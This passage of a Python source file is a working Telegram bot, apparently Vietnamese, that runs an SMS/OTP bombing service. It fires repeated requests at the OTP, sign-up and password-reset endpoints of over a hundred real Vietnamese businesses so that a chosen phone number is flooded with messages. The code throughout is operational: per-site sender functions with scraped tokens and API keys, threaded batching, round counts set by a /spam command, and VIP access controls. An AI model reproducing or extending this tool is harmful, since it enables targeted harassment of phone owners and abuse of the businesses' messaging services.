            'province_customer': '8',
            'agreement': '1',
            'otp_type': 'create',
            'ip': '1.1.1.1',
        }
        session.post('https://jollibee.com.vn/otp/action/getOTP', data=data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_hoangphuconline(phone: str):
    try:
        session = get_session()
        data = {
            'action_type': '1',
            'tel': phone,
            'form_key': 'iY9dnL7JVCgtlY40',
        }
        session.post('https://hoangphuconline.vn/advancedlogin/otp/CheckValii/', data=data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_alfrescos(phone: str):
    try:
        session = get_session()
        json_data = {'phoneNumber': phone, 'secureHash': '89b4c1ea1b74bac29a66281dbd879e00', 'deviceId': '', 'sendTime': 1701424097166, 'type': 1}
        session.post('https://api.alfrescos.com.vn/api/v1/User/SendSms', params={'culture': 'vi-VN'}, json=json_data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_selly(phone: str):
    try:
        session = get_session()
        phone_fmt = '+84' + phone[1:] if phone.startswith('0') else phone
        json_data = {'phone': phone_fmt, 'forceSendSms': True, 'checksum': '8539e0f677a98bd1bac1f9c50992363b95b36abe'}
        session.post('https://app-api.selly.vn/users/request-otp', json=json_data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_medpro(phone: str):
    try:
        session = get_session()
        json_data = {'fullname': 'nguoi dung medpro', 'deviceId': 'f812a55d1d5ee2b87a927833df2608bc', 'phone': phone, 'type': 'password'}
        session.post('https://api-v2.medpro.com.vn/user/phone-register', json=json_data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_circa(phone: str):
    try:
        session = get_session()
        phone_num = phone[1:] if phone.startswith('0') else phone
        json_data = {'phone': {'country_code': '84', 'phone_number': phone_num}}
        session.post('https://api.circa.vn/v1/entity/validation-phone', json=json_data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_ticketbox(phone: str):
    try:
        session = get_session()
        json_data = {'phone': '+84' + phone}
        session.post('https://api-movie.ticketbox.vn/v1/users/otps/send', json=json_data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_medlatec(phone: str):
    try:
        session = get_session()
        data = f'PhoneOrEmail={phone}&Password=%40vrxx1337&ConfirmPassword=%40vrxx1337'
        session.post('https://medlatec.vn/auth/register/', data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_acfc(phone: str):
    try:
        session = get_session()
        data = {'number_phone': phone, 'form_key': 'qVs787dP8DpMIb0L', 'currentUrl': 'https://www.acfc.com.vn/customer/account/create/'}
        session.post('https://www.acfc.com.vn/mgn_customer/customer/sendOTP', data=data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_vamo(phone: str):
    try:
        session = get_session()
        phone_num = phone[1:] if phone.startswith('0') else phone
        json_data = {'username': phone_num}
        session.post('https://vamo.com.vn/ws/api/public/login-with-otp/generate-otp', json=json_data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_meta(phone: str):
    try:
        session = get_session()
        json_data = {'api_args': {'lgUser': phone, 'type': 'phone'}, 'api_method': 'CheckRegister'}
        session.post('https://meta.vn/app_scripts/pages/AccountReact.aspx', params={'api_mode': '1'}, json=json_data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_cellphones(phone: str):
    try:
        session = get_session()
        json_data = {'phone': phone, 'g-recaptcha-response': ''}
        session.post('https://api.cellphones.com.vn/v3/otp/phone/lost-password', json=json_data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_funring(phone: str):
    try:
        session = get_session()
        phone_num = phone[1:] if phone.startswith('0') else phone
        json_data = {'username': phone_num, 'captcha': 'xdm5n'}
        session.post('http://funring.vn/api/v1.0.1/jersey/user/getotp', json=json_data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_phuclong(phone: str):
    try:
        session = get_session()
        json_data = {'userName': phone}
        session.post('https://api-crownx.winmart.vn/as/api/plg/v1/user/forgot-pwd', json=json_data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_gapowork(phone: str):
    try:
        session = get_session()
        json_data = {'phone_number': phone, 'device_id': '9434ec2e-61e7-4b48-913b-ec9eaf31220b', 'device_model': 'web'}
        session.post('https://api.gapowork.vn/auth/v3.1/signup', json=json_data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_vietlott(phone: str):
    try:
        session = get_session()
        json_data = {'phoneNumber': phone}
        session.post('https://api-mobi.vietlottsms.vn/mobile-api/register/registerWithPhoneNumber', json=json_data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_thitruongsi(phone: str):
    try:
        session = get_session()
        json_data = {'account_phone': phone, 'recaptcha_token': '', 'recaptcha_verify_only': True}
        session.post('https://api.thitruongsi.com/v1/user/api/v4/users/register/step1-phone', json=json_data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_nhathuocankhang(phone: str):
    try:
        session = get_session()
        data = {'phoneNumber': phone, 'isReSend': 'false', 'sendOTPType': '1', '__RequestVerificationToken': 'CfDJ8NJ72x-heHlJrMocXFWhvq7MuAMwPk1UH9-tms4I4JoAfe2Rb76O5SFZTOjFJa4WAHTfXmtlRI4wAuwvdpTr9CPqCxuNz8NI0u5b0Ula-MtLDMDEQ4C5CHijrHd_sJOne8tLVN9DfeXIgnca4GDNPNY'}
        session.post('https://www.nhathuocankhang.com/lich-su-mua-hang/LoginV2/GetVerifyCode', data=data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_chotot(phone: str):
    try:
        session = get_session()
        json_data = {'phone': phone, 'password': '', 'otp': '', 'platform': 'w'}
        session.post('https://gateway.chotot.com/v2/public/auth/forget_password', json=json_data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_utop(phone: str):
    try:
        session = get_session()
        phone_fmt = '+84' + phone[1:] if phone.startswith('0') else phone
        json_data = {'phoneNumber': phone_fmt}
        headers = {'ocp-apim-subscription-key': 'd4fc34dd08904749be498e5e47b813cc', 'api-version': 'v1'}
        session.post('https://api.utopapp.net/partner/otp/RequestOTP', json=json_data, headers=headers, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_bachhoaxanh(phone: str):
    try:
        session = get_session()
        json_data = {'deviceId': '7b33dc50-81df-4f90-b265-cdf6abbeb30f', 'userName': phone, 'isOnlySms': 0, 'ip': ''}
        headers = {'authorization': 'Bearer C56D97E26D5A1DEE4199D9A6A06C082F', 'xapikey': 'bhx-api-core-2022', 'platform': 'webnew', 'deviceid': '7b33dc50-81df-4f90-b265-cdf6abbeb30f'}
        session.post('https://apibhx.tgdd.vn/User/LoginWithPassword', json=json_data, headers=headers, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_aloline(phone: str):
    try:
        session = get_session()
        json_data = {'phone': phone}
        headers = {'ProjectId': '8003', 'Method': '1'}
        session.post('https://api.gateway.overate-vntech.com/api/v8/customers/register', json=json_data, headers=headers, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_mioto(phone: str):
    try:
        session = get_session()
        phone_fmt = '84' + phone[1:] if phone.startswith('0') else phone
        params = {'phone': ' ' + phone_fmt, 'action': '1', 'otpBy': '0'}
        session.post('https://accounts.mioto.vn/mapi/phone/otp/gen', params=params, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_vnggames(phone: str):
    try:
        session = get_session()
        json_data = {'phone': phone, 'password': 'AZ56pkAeNfyXemY', 'regionCode': '', 'isoCode': 'VN', 'countryCode': 'VN', 'countryCodeType': '1', 'languageCode': 'vi', 'deviceId': 'Chrome_Windows_desktop', 'clientId': '0'}
        session.post('https://id.vnggames.app/api/v1/signup', json=json_data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_oreka(phone: str):
    try:
        session = get_session()
        json_data = {'variables': {'phone': phone, 'locale': 'vi'}, 'query': 'mutation ($phone: String!, $locale: String!) {\nsendVerifyPhoneApp(phone: $phone, locale: $locale)\n}\n'}
        session.post('https://www.oreka.vn/graphql', json=json_data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_ensure(phone: str):
    try:
        session = get_session()
        data = {'type': 'LTS', 'campagin_name': 'ENS_2024_LTS_Mar', 'name': 'Nguyen Van A', 'dob': '15-06-1998', 'address': '123 Phuong Chau Xuan', 'email': 'test@gmail.com', 'city': 'Ha Noi', 'city_code': 'HN', 'district': 'Ba Dinh', 'district_code': 'HN.BD', 'phone': phone, '_token': 'bp4PjS1lA8VwWHWsxASQl5SoKR350m13xsdyfvzO'}
        session.post('https://ensure.vn/process-page1/getotp', data=data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_vsports(phone: str):
    try:
        session = get_session()
        json_data = {'email': phone}
        session.post('https://vsports.vn/api/v1/users/verify/send', params={'lang': 'vi'}, json=json_data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_ssi(phone: str):
    try:
        session = get_session()
        json_data = {'mobile': phone, 'email': 'test@gmail.com', 'fullName': 'Nguyen Van A', 'password': 'K36U7JG#Ffy#9#!', 'channel': 'AP'}
        session.post('https://accounts-api.ssi.com.vn/customer/account/validate-non-trading-user-info', json=json_data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_fptshop2(phone: str):
    try:
        session = get_session()
        data = {'phone': phone, 'typeReset': '0'}
        session.post('https://fptshop.com.vn/api-data/loyalty/Login/Verification', data=data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_tv360m(phone: str):
    try:
        session = get_session()
        json_data = {'msisdn': phone}
        session.post('https://m.tv360.vn/public/v1/auth/get-otp-login', json=json_data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_vietloan2(phone: str):
    try:
        session = get_session()
        data = {
            'phone': phone,
            '_token': '0fgGIpezZElNb6On3gIr9jwFGxdY64YGrF8bAeNU',
        }
        session.post('https://vietloan.vn/register/phone-resend', data=data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_mutosi1(phone: str):
    try:
        session = get_session()
        json_data = {
            'phone': phone,
            'token': '',
            'source': 'web_consumers',
        }
        headers = {
            'Authorization': 'Bearer 226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b',
        }
        session.post('https://api-omni.mutosi.com/client/auth/reset-password/send-phone', json=json_data, headers=headers, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_myviettel4(phone: str):
    try:
        session = get_session()
        json_data = {'phone': phone, 'type': ''}
        headers = {
            'X-CSRF-TOKEN': '2n3Pu6sXr6yg5oNaUQ5vYHMuWknKR8onc4CeAJ1i',
        }
        session.post('https://viettel.vn/api/get-otp-login', json=json_data, headers=headers, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_pharmacity(phone: str):
    try:
        session = get_session()
        json_data = {'phone': phone, 'referral': ''}
        session.post('https://api-gateway.pharmacity.vn/customers/register/otp', json=json_data, timeout=REQUEST_TIMEOUT)
    except:
        pass

def send_otp_via_moneyveo(phone: str):
    try:
        session = get_session()
        data = {'phoneNumber': phone}
        session.post('https://moneyveo.vn/vi/registernew/sendsmsjson/', data=data, timeout=REQUEST_TIMEOUT)
    except:
        pass

# DANH SÁCH TẤT CẢ CÁC HÀM GỬI
ALL_SENDERS = [
    ("sapo", send_otp_via_sapo),
    ("viettel", send_otp_via_viettel),
    ("medicare", send_otp_via_medicare),
    ("tv360", send_otp_via_tv360),
    ("dienmayxanh", send_otp_via_dienmayxanh),
    ("kingfoodmart", send_otp_via_kingfoodmart),
    ("mocha", send_otp_via_mocha),
    ("fptdk", send_otp_via_fptdk),
    ("fptmk", send_otp_via_fptmk),
    ("vieon", send_otp_via_VIEON),
    ("ghn", send_otp_via_ghn),
    ("lottemart", send_otp_via_lottemart),
    ("dongcre", send_otp_via_DONGCRE),
    ("shopee", send_otp_via_shopee),
    ("tgdd", send_otp_via_TGDD),
    ("fptshop", send_otp_via_fptshop),
    ("winmart", send_otp_via_WinMart),
    ("vietloan", send_otp_via_vietloan),
    ("lozi", send_otp_via_lozi),
    ("f88", send_otp_via_F88),
    ("spacet", send_otp_via_spacet),
    ("vinpearl", send_otp_via_vinpearl),
    ("traveloka", send_otp_via_traveloka),
    ("dongplus", send_otp_via_dongplus),
    ("longchau", send_otp_via_longchau),
    ("longchau1", send_otp_via_longchau1),
    ("galaxyplay", send_otp_via_galaxyplay),
    ("emartmall", send_otp_via_emartmall),
    ("ahamove", send_otp_via_ahamove),
    ("viettelmoney", send_otp_via_ViettelMoney),
    ("xanhsmsms", send_otp_via_xanhsmsms),
    ("xanhsmzalo", send_otp_via_xanhsmzalo),
    ("popeyes", send_otp_via_popeyes),
    ("acheckin", send_otp_via_ACHECKIN),
    ("appota", send_otp_via_APPOTA),
    ("watsons", send_otp_via_Watsons),
    ("hoangphuc", send_otp_via_hoangphuc),
    ("fmcomvn", send_otp_via_fmcomvn),
    ("reebokvn", send_otp_via_Reebokvn),
    ("thefaceshop", send_otp_via_thefaceshop),
    ("beautybox", send_otp_via_BEAUTYBOX),
    ("futabus", send_otp_via_futabus),
    ("viettelpost", send_otp_via_ViettelPost),
    ("myviettel2", send_otp_via_myviettel2),
    ("myviettel3", send_otp_via_myviettel3),
    ("tokyolife", send_otp_via_TOKYOLIFE),
    ("30shine", send_otp_via_30shine),
    ("cathaylife", send_otp_via_Cathaylife),
    ("dominos", send_otp_via_dominos),
    ("vinamilk", send_otp_via_vinamilk),
    ("batdongsan", send_otp_via_batdongsan),
    ("gumac", send_otp_via_GUMAC),
    ("mutosi", send_otp_via_mutosi),
    ("vietair", send_otp_via_vietair),
    ("fahasa", send_otp_via_FAHASA),
    ("hopiness", send_otp_via_hopiness),
    ("modcha35", send_otp_via_modcha35),
    ("bibabo", send_otp_via_Bibabo),
    ("moca", send_otp_via_MOCA),
    ("pantio", send_otp_via_pantio),
    ("routine", send_otp_via_Routine),
    ("vayvnd", send_otp_via_vayvnd),
    ("tima", send_otp_via_tima),
    ("moneygo", send_otp_via_moneygo),
    ("takomo", send_otp_via_takomo),
    ("paynet", send_otp_via_paynet),
    ("pico", send_otp_via_pico),
    ("pnj", send_otp_via_PNJ),
    ("tiniworld", send_otp_via_TINIWORLD),
    ("trungsoncare", send_otp_via_trungsoncare),
    ("fptid", send_otp_via_fptid),
    ("vinid", send_otp_via_vinid),
    ("hasaki", send_otp_via_hasaki),
    ("vuihoc", send_otp_via_vuihoc),
    ("best_inc", send_otp_via_best_inc),
    ("vndirect", send_otp_via_vndirect),
    ("guardian", send_otp_via_guardian),
    ("jollibee", send_otp_via_jollibee),
    ("hoangphuconline", send_otp_via_hoangphuconline),
    ("alfrescos", send_otp_via_alfrescos),
    ("selly", send_otp_via_selly),
    ("medpro", send_otp_via_medpro),
    ("circa", send_otp_via_circa),
    ("ticketbox", send_otp_via_ticketbox),
    ("medlatec", send_otp_via_medlatec),
    ("acfc", send_otp_via_acfc),
    ("vamo", send_otp_via_vamo),
    ("meta", send_otp_via_meta),
    ("cellphones", send_otp_via_cellphones),
    ("funring", send_otp_via_funring),
    ("phuclong", send_otp_via_phuclong),
    ("gapowork", send_otp_via_gapowork),
    ("vietlott", send_otp_via_vietlott),
    ("thitruongsi", send_otp_via_thitruongsi),
    ("nhathuocankhang", send_otp_via_nhathuocankhang),
    ("chotot", send_otp_via_chotot),
    ("utop", send_otp_via_utop),
    ("bachhoaxanh", send_otp_via_bachhoaxanh),
    ("aloline", send_otp_via_aloline),
    ("mioto", send_otp_via_mioto),
    ("vnggames", send_otp_via_vnggames),
    ("oreka", send_otp_via_oreka),
    ("ensure", send_otp_via_ensure),
    ("vsports", send_otp_via_vsports),
    ("ssi", send_otp_via_ssi),
    ("fptshop2", send_otp_via_fptshop2),
    ("tv360m", send_otp_via_tv360m),
    ("vietloan2", send_otp_via_vietloan2),
    ("mutosi1", send_otp_via_mutosi1),
    ("myviettel4", send_otp_via_myviettel4),
    ("pharmacity", send_otp_via_pharmacity),
    ("moneyveo", send_otp_via_moneyveo),
]

# CHIA BATCH
SENDER_BATCHES = [ALL_SENDERS[i:i+BATCH_SIZE] for i in range(0, len(ALL_SENDERS), BATCH_SIZE)]

# HÀM SPAM CHÍNH - ĐÃ SỬA LỖI
def call_api_with_log(name, func, phone):
    """Wrapper gọi API và trả về kết quả để log"""
    try:
        func(phone)
        return (name, True, None)
    except Exception as e:
        return (name, False, str(e))

def spam_worker(phone: str, total_rounds: int, stop_event: threading.Event):
    for round_num in range(1, total_rounds + 1):
        if stop_event.is_set():
            print(f"[{phone}] Stopped at round {round_num}")
            break

        print(f"[{phone}] Round {round_num}/{total_rounds} started")

        success_count = 0
        fail_count = 0

        # Gửi theo batch
        for batch_idx, batch in enumerate(SENDER_BATCHES):
            if stop_event.is_set():
                break
            
            batch_names = [name for name, _ in batch]
            print(f"[{phone}] Batch {batch_idx+1}/{len(SENDER_BATCHES)} - Gửi: {', '.join(batch_names)}")
            
            with ThreadPoolExecutor(max_workers=min(MAX_THREADS_PER_TARGET, len(batch))) as executor:
                futures = []
                for name, func in batch:
                    futures.append(executor.submit(call_api_with_log, name, func, phone))
                
                # Đợi các future hoàn thành
                for future in futures:
                    try:
                        if stop_event.is_set():
                            break
                        result = future.result(timeout=REQUEST_TIMEOUT + 5)
                        if result:
                            api_name, ok, err = result
                            if ok:
                                success_count += 1
                            else:
                                fail_count += 1
                                print(f"[{phone}] ❌ {api_name}: {err}")
                    except Exception as e:
                        fail_count += 1
            
            print(f"[{phone}] Batch {batch_idx+1}/{len(SENDER_BATCHES)} xong")
        
        print(f"[{phone}] Round {round_num} xong - ✅ {success_count} thành công, ❌ {fail_count} lỗi")
        
        # Delay giữa các round
        if round_num < total_rounds and not stop_event.is_set():
            delay = random.uniform(*DELAY_BETWEEN_ROUNDS_SEC)
            print(f"[{phone}] Waiting {delay:.1f}s before next round...")
            time.sleep(delay)

    print(f"[{phone}] Completed {round_num} rounds")
    with jobs_lock:
        if phone in active_jobs:
            del active_jobs[phone]

# CÁC LỆNH TELEGRAM
@bot.message_handler(commands=['start', 'help'])
def cmd_start(message: Message):
    add_user(message.chat.id)
    help_text = "Lệnh:\n/spam <số điện thoại> <số vòng>\n/stop <số điện thoại>\n/stopall\n/status"
    if message.chat.id in ADMIN_IDS:
        help_text += "\n\n🔑 Lệnh Admin:\n/rolevip : Bật/tắt chế độ VIP\n/addvip <id> : Thêm VIP\n/kickvip <id> : Xoá VIP\n/host : Xem cấu hình host\n/msg <nội_dung> : Gửi TB cho tất cả user"
    bot.reply_to(message, help_text)

# --- LỆNH ADMIN ---
@bot.message_handler(commands=['rolevip'])
def cmd_rolevip(message: Message):
    global VIP_ONLY_MODE
    if message.chat.id not in ADMIN_IDS:
        return
    VIP_ONLY_MODE = not VIP_ONLY_MODE
    status = "BẬT 🟢 (Chỉ VIP mới được dùng bot)" if VIP_ONLY_MODE else "TẮT 🔴 (Ai cũng được dùng bot)"
    bot.reply_to(message, f"Chế độ VIP_ONLY đang: {status}")

@bot.message_handler(commands=['addvip'])
def cmd_addvip(message: Message):
    if message.chat.id not in ADMIN_IDS:
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "Sai cú pháp. Dùng: /addvip <id_telegram>")
        return
    vip_id = parts[1].strip()
    vips_list.add(vip_id)
    save_list(VIP_FILE, vips_list)
    bot.reply_to(message, f"✅ Đã thêm {vip_id} vào danh sách VIP.")

@bot.message_handler(commands=['kickvip'])
def cmd_kickvip(message: Message):
    if message.chat.id not in ADMIN_IDS:
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "Sai cú pháp. Dùng: /kickvip <id_telegram>")
        return
    vip_id = parts[1].strip()
    if vip_id in vips_list:
        vips_list.remove(vip_id)
        save_list(VIP_FILE, vips_list)
        bot.reply_to(message, f"🗑 Đã xoá {vip_id} khỏi danh sách VIP.")
    else:
        bot.reply_to(message, f"ID {vip_id} không có trong danh sách VIP.")

@bot.message_handler(commands=['host', 'stats'])
def cmd_host(message: Message):
    if message.chat.id not in ADMIN_IDS:
        return
    
    if psutil is None:
        bot.reply_to(message, "⚠️ Lệnh /host yêu cầu cài đặt thư viện `psutil`.\nHãy chạy lệnh: `pip install psutil` trên máy chủ.")
        return

    try:
        cpu = psutil.cpu_percent(interval=1)
        ram = psutil.virtual_memory()
        disk = psutil.disk_usage('/')
        
        stats = (
            f"🖥 **Thông số máy chủ:**\n"
            f"CPU: {cpu}%\n"
            f"RAM: {ram.percent}% ({ram.used // (1024**2)}MB / {ram.total // (1024**2)}MB)\n"
            f"DISK: {disk.percent}% ({disk.used // (1024**3)}GB / {disk.total // (1024**3)}GB)"
        )
    except Exception as e:
        stats = f"🖥 **Thông số máy chủ:**\nKhông thể lấy thông tin vì thiếu thư viện. Lỗi: {e}"
        
    bot.reply_to(message, stats, parse_mode='Markdown')

@bot.message_handler(commands=['msg'])
def cmd_msg(message: Message):
    if message.chat.id not in ADMIN_IDS:
        return
    text = message.text.replace('/msg ', '', 1).strip()
    if not text or text == '/msg':
        bot.reply_to(message, "Vui lòng nhập nội dung. Cú pháp: /msg Nội dung thông báo")
        return
        
    success = 0
    fail = 0
    bot.reply_to(message, f"Bắt đầu gửi thông báo đến {len(users_list)} người dùng...")
    for uid in users_list:
        try:
            bot.send_message(uid, f"📢 **Thông báo từ Admin:**\n\n{text}", parse_mode='Markdown')
            success += 1
        except Exception:
            fail += 1
    
    bot.reply_to(message, f"✅ Gửi xong!\nThành công: {success}\nThất bại: {fail}")
# ------------------

@bot.message_handler(commands=['spam'])
def cmd_spam(message: Message):
    add_user(message.chat.id)
    
    # Kiểm tra VIP MODE
    user_id_str = str(message.chat.id)
    if VIP_ONLY_MODE:
        if user_id_str not in vips_list and message.chat.id not in ADMIN_IDS:
            bot.reply_to(message, "⛔️ Bot đang ở chế độ VIP Only. Chỉ tài khoản VIP mới được sử dụng.")
            return

    parts = message.text.split()
    if len(parts) != 3:
        bot.reply_to(message, "Sai cú pháp. Dùng: /spam 0909123456 30")
        return

    phone = parts[1].strip()
    try:
        count = int(parts[2])
    except:
        bot.reply_to(message, "Số vòng phải là số nguyên.")
        return

    if count < 1 or count > 100:
        bot.reply_to(message, "Số vòng từ 1-100")
        return

    if not is_valid_vn_phone(phone):
        bot.reply_to(message, "Số điện thoại không hợp lệ (phải là số Việt Nam: 03/05/07/08/09 + 8 số)")
        return

    with jobs_lock:
        if phone in active_jobs:
            bot.reply_to(message, f"{phone} đang chạy. Dùng /stop {phone} để dừng")
            return
        if len(active_jobs) >= MAX_CONCURRENT_TARGETS:
            bot.reply_to(message, f"Đã đạt giới hạn {MAX_CONCURRENT_TARGETS} job")
            return

        stop_event = threading.Event()
        job_thread = threading.Thread(target=spam_worker, args=(phone, count, stop_event), daemon=True)

        active_jobs[phone] = {
            'stop_event': stop_event,
            'thread': job_thread,
            'rounds': count,
            'started': datetime.now(),
            'chat_id': message.chat.id
        }
        job_thread.start()

    bot.reply_to(message, f"✅ Bắt đầu spam {phone} ({count} vòng)\nDùng /stop {phone} để dừng")

@bot.message_handler(commands=['stop'])
def cmd_stop(message: Message):
    parts = message.text.split()
    target = parts[1].strip() if len(parts) > 1 else None

    with jobs_lock:
        if target:
            if target not in active_jobs:
                bot.reply_to(message, f"Không tìm thấy {target} trong danh sách đang chạy")
                return
            active_jobs[target]['stop_event'].set()
            bot.reply_to(message, f"⏹️ Đã yêu cầu dừng {target}")
        else:
            if not active_jobs:
                bot.reply_to(message, "Không có job nào đang chạy")
                return
            lines = ["📋 Jobs đang chạy:"]
            for ph, info in active_jobs.items():
                elapsed = (datetime.now() - info['started']).seconds // 60
                lines.append(f"- {ph} ({info['rounds']} vòng) - {elapsed} phút")
            bot.reply_to(message, "\n".join(lines))

@bot.message_handler(commands=['stopall'])
def cmd_stopall(message: Message):
    with jobs_lock:
        cnt = len(active_jobs)
        if cnt == 0:
            bot.reply_to(message, "Không có job nào")
            return
        for info in active_jobs.values():
            info['stop_event'].set()
        bot.reply_to(message, f"⏹️ Đã yêu cầu dừng tất cả ({cnt} job)")

@bot.message_handler(commands=['status'])
def cmd_status(message: Message):
    with jobs_lock:
        if not active_jobs:
            bot.reply_to(message, "Không có job nào đang chạy")
            return
        lines = [f"📊 Đang chạy {len(active_jobs)}/{MAX_CONCURRENT_TARGETS} job:"]
        for ph, info in active_jobs.items():
            start_str = info['started'].strftime("%H:%M:%S")
            elapsed = (datetime.now() - info['started']).seconds // 60
            lines.append(f"- {ph}: {info['rounds']} vòng, bắt đầu {start_str}, chạy {elapsed} phút")
        bot.reply_to(message, "\n".join(lines))

# FLASK APP
app = Flask(__name__)

@app.route('/')
def home():
    return "Bot đang chạy - Optimized Version"

def run_polling():
    while True:
        try:
            bot.polling(none_stop=True, interval=1, timeout=30)
        except Exception as e:
            print(f"Polling error: {e}")
            time.sleep(5)

if __name__ == '__main__':
    print("🚀 Khởi động bot...")
    print(f"📱 Số lượng API: {len(ALL_SENDERS)}")
    print(f"⚙️  Batch size: {BATCH_SIZE}, Max threads: {MAX_THREADS_PER_TARGET}")
    
    # Thiết lập menu lệnh cho Bot trên Telegram
    try:
        commands = [
            telebot.types.BotCommand("start", "Bắt đầu và xem hướng dẫn"),
            telebot.types.BotCommand("spam", "Bắt đầu spam (vd: /spam 09xxx 30)"),
            telebot.types.BotCommand("stop", "Dừng spam 1 số (vd: /stop 09xxx)"),
            telebot.types.BotCommand("stopall", "Dừng tất cả các tiến trình spam"),
            telebot.types.BotCommand("status", "Xem danh sách các số đang spam"),
        ]
        bot.set_my_commands(commands)
        print("✅ Đã cập nhật menu lệnh cho Bot.")
    except Exception as e:
        print(f"⚠️ Không thể cài đặt menu lệnh: {e}")

    # Chạy polling trong thread riêng
    polling_thread = threading.Thread(target=run_polling, daemon=True)
    polling_thread.start()
    
    # Chạy Flask
    port = int(os.environ.get('PORT', 30025))
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
